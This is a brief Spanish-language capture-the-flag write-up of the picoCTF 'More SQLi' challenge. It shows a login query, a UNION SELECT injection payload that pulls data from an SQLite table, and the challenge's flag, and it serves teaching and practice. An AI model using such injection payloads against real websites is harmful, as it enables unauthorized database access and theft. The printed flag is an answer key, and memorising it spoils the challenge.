Reto
More SQLi
Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:60258/).
Solución
```
Entramos a la página
Intentamos entrar

username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'

Realizamos una inyección basica de SQL

# Welcome

[](http://saturn.picoctf.net:53890/logout.php)

### Search Office

|City|Address|Phone|
|---|---|---|
|Algiers|Birger Jarlsgatan 7, 4 tr|+246 8-616 99 40|
|Bamako|Friedrichstraße 68|+249 173 329 6295|
|Nairobi|Ferdinandstraße 35|+254 703 039 810|
|Kampala|Maybe all the tables|+256 720 7705600|
|Kigali|8 Ganton Street|+250 7469 214 950|
|Kinshasa|Sternstraße 5|+249 89 885 627 88|
|Lagos|Karl Johans gate 23B, 4. etasje|+234 224 25 150|
|Pretoria|149 Rue Saint-Honoré|+233 635 46 15 03|

Buscamos la bandera con SQLlite

'union select id,flag,3 from more_table;

|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}|3|
|2|If you are here, you must have seen it|3|
```
Notas adicionales
Referencias